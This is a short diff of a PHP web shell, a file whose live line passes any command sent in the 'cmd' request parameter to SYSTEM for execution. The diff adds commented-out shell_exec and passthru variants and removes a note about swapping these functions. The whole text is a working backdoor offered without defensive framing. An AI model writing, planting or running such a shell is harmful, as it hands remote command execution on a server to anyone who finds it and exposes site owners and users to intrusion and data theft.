@@ -1,5 +1,5 @@
 <?php 
 SYSTEM($_REQUEST['cmd']);
+// echo shell_exec($_GET['cmd']);
+// echo passthru($_GET['cmd']);
 ?>
-
-// SYSTEM can be replaced with shell_exec or exec (make sure to echo before)
